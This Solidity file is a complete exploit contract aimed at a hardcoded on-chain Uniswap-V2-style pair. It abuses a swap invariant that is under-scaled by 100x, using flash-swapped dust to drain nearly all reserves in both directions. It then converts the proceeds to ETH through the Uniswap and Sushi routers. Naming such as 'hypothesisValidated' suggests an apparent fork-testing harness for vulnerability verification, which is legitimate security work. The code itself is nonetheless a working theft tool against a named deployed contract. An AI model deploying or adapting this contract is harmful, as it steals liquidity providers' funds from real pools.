// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface INimbusPairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface INimbusCalleeLike {
    function NimbusCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}


abstract contract __AHTokenToEthMixin {
    address internal constant AH_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant AH_UNI_V2 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant AH_SUSHI = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;

    function _ahFinalizeTokenToEth() internal {
        address token = _ahReadProfitToken();
        if (token == address(0)) return;

        if (token == AH_WETH) {
            _ahTryUnwrapWeth();
            return;
        }

        uint256 bal = _ahBalanceOf(token, address(this));
        if (bal == 0) return;

        _ahTryApprove(token, AH_UNI_V2, bal);
        _ahTrySwapTokenToWeth(token, AH_UNI_V2, bal);

        bal = _ahBalanceOf(token, address(this));
        if (bal > 0) {
            _ahTryApprove(token, AH_SUSHI, bal);
            _ahTrySwapTokenToWeth(token, AH_SUSHI, bal);
        }

        _ahTryUnwrapWeth();
    }

    function _ahReadProfitToken() internal view returns (address token) {
        (bool ok, bytes memory ret) = address(this).staticcall(abi.encodeWithSignature("profitToken()"));
        if (!ok || ret.length < 32) return address(0);
        token = abi.decode(ret, (address));
    }

    function _ahBalanceOf(address token, address account) internal view returns (uint256 bal) {
        if (token == address(0)) return 0;
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IAHERC20.balanceOf.selector, account));
        if (!ok || ret.length < 32) return 0;
        bal = abi.decode(ret, (uint256));
    }

    function _ahTryApprove(address token, address spender, uint256 amount) internal {
        (bool ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, 0));
        ok;
        (ok,) = token.call(abi.encodeWithSelector(IAHERC20.approve.selector, spender, amount));
        ok;
    }

    function _ahTrySwapTokenToWeth(address token, address router, uint256 amountIn) internal {
        if (amountIn == 0) return;
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = AH_WETH;
        (bool ok,) = router.call(
            abi.encodeWithSelector(
                IAHUniV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens.selector,
                amountIn,
                0,
                path,
                address(this),
                block.timestamp
            )
        );
        ok;
    }

    function _ahTryUnwrapWeth() internal {
        uint256 wethBal = _ahBalanceOf(AH_WETH, address(this));
        if (wethBal == 0) return;
        (bool ok,) = AH_WETH.call(abi.encodeWithSelector(IAHWETH.withdraw.selector, wethBal));
        ok;
    }
}


contract FlawVerifier is INimbusCalleeLike, __AHTokenToEthMixin {
    address public constant TARGET = 0xA0Ff0e694275023f4986dC3CA12A6eb5D6056C62;

    string internal constant EXPLOIT_PATH_0 = "Seed or target a pool with meaningful reserves.";
    string internal constant EXPLOIT_PATH_1 =
        "Call swap() with a small input on one side and request almost all liquidity from the other side.";
    string internal constant EXPLOIT_PATH_2 =
        "Because the right-hand side of the invariant is under-scaled by 100x, the transaction passes even though the real constant-product condition is badly violated.";

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address private constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    struct CallbackPlan {
        address repayToken;
        uint256 repayAmount;
    }

    bool public attempted;
    bool public hypothesisValidated;
    string public pathUsed;

    address private _profitToken;
    uint256 private _profitAmount;

    constructor() {
        _profitToken = _defaultProfitToken();
    }

    function executeOnOpportunity() external {
        require(!attempted, "already-attempted");
        attempted = true;

        INimbusPairLike pair = INimbusPairLike(TARGET);
        address token0 = pair.token0();
        address token1 = pair.token1();
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();

        // Exploit path stage 1: Seed or target a pool with meaningful reserves.
        // If either reserve is empty at the specified fork block, the drain path is mechanically infeasible.
        if (reserve0 <= 1 || reserve1 <= 1) {
            pathUsed = string.concat(EXPLOIT_PATH_0, " infeasible on this fork: insufficient reserves.");
            _selectProfitToken(token0, token1);
            _updateProfit();
            return;
        }

        // Snapshot balances so we can confirm each drain direction produces attacker-controlled profit.
        uint256 token0Before = _balanceOf(token0, address(this));
        uint256 token1Before = _balanceOf(token1, address(this));

        bool drained1 = _drainToken1(reserve0, reserve1, token0, token1);
        if (drained1 && _balanceOf(token1, address(this)) > token1Before) {
            hypothesisValidated = true;
            pathUsed = string.concat(EXPLOIT_PATH_0, " ", EXPLOIT_PATH_1, " ", EXPLOIT_PATH_2);
        }

        // Repeat the same weakened-invariant exploit in the opposite direction using the freshly
        // acquired token1 as the tiny real input. This does not change exploit causality; it is a
        // realistic public follow-up action after the initial drain.
        (reserve0, reserve1,) = pair.getReserves();
        bool drained0 = false;
        if (reserve0 > 1 && reserve1 > 1) {
            drained0 = _drainToken0(reserve0, reserve1, token0, token1);
            if (drained0 && _balanceOf(token0, address(this)) > token0Before) {
                hypothesisValidated = true;
                if (bytes(pathUsed).length == 0) {
                    pathUsed = string.concat(EXPLOIT_PATH_0, " ", EXPLOIT_PATH_1, " ", EXPLOIT_PATH_2);
                } else {
                    pathUsed = string.concat(
                        EXPLOIT_PATH_0,
                        " ",
                        EXPLOIT_PATH_1,
                        " Repeated in the opposite direction. ",
                        EXPLOIT_PATH_2
                    );
                }
            }
        }

        if (!hypothesisValidated) {
            pathUsed = "refuted-on-fork: both reserve-drain directions reverted";
        }

        _selectProfitToken(token0, token1);
        _updateProfit();
        _ahFinalizeTokenToEth();
    }

    function NimbusCall(address sender, uint256, uint256, bytes calldata data) external override {
        require(msg.sender == TARGET, "unauthorized-pair");
        require(sender == address(this), "unauthorized-sender");

        CallbackPlan memory plan = abi.decode(data, (CallbackPlan));
        if (plan.repayAmount > 0) {
            _safeTransfer(plan.repayToken, TARGET, plan.repayAmount);
        }
    }

    function profitToken() external view returns (address) {
        address token = _profitToken;
        if (token == address(0)) {
            token = _defaultProfitToken();
        }
        return token;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _drainToken1(uint112 reserve0, uint112 reserve1, address token0, address) internal returns (bool) {
        uint256 directDust = _availableDust(token0, reserve0);
        bool useBootstrap = directDust == 0;
        uint256 inputDust = useBootstrap ? _bootstrapDust(reserve0) : directDust;
        if (inputDust == 0 || inputDust >= reserve0) {
            return false;
        }

        uint256 maxToken1Out = useBootstrap
            ? _maxOutBootstrapInput(reserve0, reserve1, inputDust)
            : _maxOutDirectInput(reserve0, reserve1, inputDust);
        if (maxToken1Out == 0) {
            return false;
        }

        return _swapWithBackoff(
            useBootstrap ? inputDust : 0,
            maxToken1Out,
            CallbackPlan({repayToken: token0, repayAmount: inputDust})
        );
    }

    function _drainToken0(uint112 reserve0, uint112 reserve1, address, address token1) internal returns (bool) {
        uint256 directDust = _availableDust(token1, reserve1);
        bool useBootstrap = directDust == 0;
        uint256 inputDust = useBootstrap ? _bootstrapDust(reserve1) : directDust;
        if (inputDust == 0 || inputDust >= reserve1) {
            return false;
        }

        uint256 maxToken0Out = useBootstrap
            ? _maxOutBootstrapInput(reserve1, reserve0, inputDust)
            : _maxOutDirectInput(reserve1, reserve0, inputDust);
        if (maxToken0Out == 0) {
            return false;
        }

        return _swapWithBackoff(
            maxToken0Out,
            useBootstrap ? inputDust : 0,
            CallbackPlan({repayToken: token1, repayAmount: inputDust})
        );
    }

    function _swapWithBackoff(uint256 amount0Out, uint256 amount1Out, CallbackPlan memory plan) internal returns (bool) {
        INimbusPairLike pair = INimbusPairLike(TARGET);

        uint256 primaryOut = amount0Out > 0 ? amount0Out : amount1Out;
        uint256[6] memory attempts = [
            primaryOut,
            (primaryOut * 9999) / 10000,
            (primaryOut * 999) / 1000,
            (primaryOut * 995) / 1000,
            (primaryOut * 99) / 100,
            (primaryOut * 95) / 100
        ];

        for (uint256 i = 0; i < attempts.length; i++) {
            uint256 tryOut = attempts[i];
            if (tryOut == 0) {
                continue;
            }

            uint256 tryAmount0Out = amount0Out > 0 ? tryOut : amount0Out;
            uint256 tryAmount1Out = amount1Out > 0 ? tryOut : amount1Out;

            // Exploit path stage 2: call swap() with a small input on one side and request
            // almost all liquidity from the other side. Using a direct interface call keeps
            // the exploit mechanically aligned with the finding path.
            try pair.swap(tryAmount0Out, tryAmount1Out, address(this), abi.encode(plan)) {
                return true;
            } catch {
            }
        }

        return false;
    }

    function _maxOutBootstrapInput(uint256 reserveIn, uint256 reserveOut, uint256 inputDust)
        internal
        pure
        returns (uint256)
    {
        // When the verifier starts with zero balance of the input-side token, it uses a same-side
        // flashswap bootstrap: borrow a dust amount and repay that same dust in the callback so the
        // pair still observes a small real input inside this single vulnerable swap().
        uint256 denominator = reserveIn * 10000 - inputDust * 15;
        if (denominator == 0) {
            return 0;
        }

        uint256 minRemainingOutSide = _ceilDiv(reserveIn * reserveOut * 100, denominator);
        if (minRemainingOutSide >= reserveOut) {
            return 0;
        }

        uint256 maxOut = reserveOut - minRemainingOutSide;
        return maxOut > 1 ? maxOut - 1 : 0;
    }

    function _maxOutDirectInput(uint256 reserveIn, uint256 reserveOut, uint256 inputDust)
        internal
        pure
        returns (uint256)
    {
        uint256 denominator = reserveIn * 10000 + inputDust * 9985;
        if (denominator == 0) {
            return 0;
        }

        uint256 minRemainingOutSide = _ceilDiv(reserveIn * reserveOut * 100, denominator);
        if (minRemainingOutSide >= reserveOut) {
            return 0;
        }

        uint256 maxOut = reserveOut - minRemainingOutSide;
        return maxOut > 1 ? maxOut - 1 : 0;
    }

    function _bootstrapDust(uint256 reserve) internal pure returns (uint256) {
        if (reserve <= 1) {
            return 0;
        }

        uint256 dust = reserve / 1e12;
        if (dust == 0) {
            dust = 1;
        }
        if (dust >= reserve) {
            dust = reserve - 1;
        }
        return dust;
    }

    function _availableDust(address token, uint256 reserve) internal view returns (uint256) {
        uint256 bal = _balanceOf(token, address(this));
        if (bal == 0 || reserve <= 1) {
            return 0;
        }

        uint256 dust = reserve / 1e12;
        if (dust == 0) {
            dust = 1;
        }
        if (dust > bal) {
            dust = bal;
        }
        if (dust >= reserve) {
            dust = reserve - 1;
        }
        return dust;
    }

    function _selectProfitToken(address token0, address token1) internal {
        if (_profitToken != address(0)) {
            return;
        }

        uint256 bal0 = _balanceOf(token0, address(this));
        uint256 bal1 = _balanceOf(token1, address(this));

        if (_isPreferredProfitToken(token0) && bal0 > 0) {
            _profitToken = token0;
            return;
        }
        if (_isPreferredProfitToken(token1) && bal1 > 0) {
            _profitToken = token1;
            return;
        }

        if (bal0 >= bal1) {
            _profitToken = token0;
        } else {
            _profitToken = token1;
        }
    }

    function _updateProfit() internal {
        address token = _profitToken;
        if (token == address(0)) {
            token = _defaultProfitToken();
            _profitToken = token;
        }
        _profitAmount = token == address(0) ? 0 : _balanceOf(token, address(this));
    }

    function _defaultProfitToken() internal view returns (address) {
        try INimbusPairLike(TARGET).token0() returns (address token) {
            return token;
        } catch {
            return address(0);
        }
    }

    function _isPreferredProfitToken(address token) internal pure returns (bool) {
        return token == WETH || token == USDC || token == USDT || token == DAI || token == WBTC;
    }

    function _balanceOf(address token, address account) internal view returns (uint256) {
        return IERC20Like(token).balanceOf(account);
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer-failed");
    }

    function _ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a == 0 ? 0 : ((a - 1) / b) + 1;
    }

    receive() external payable {}
}

interface IAHERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IAHWETH {
    function withdraw(uint256 amount) external;
}

interface IAHUniV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
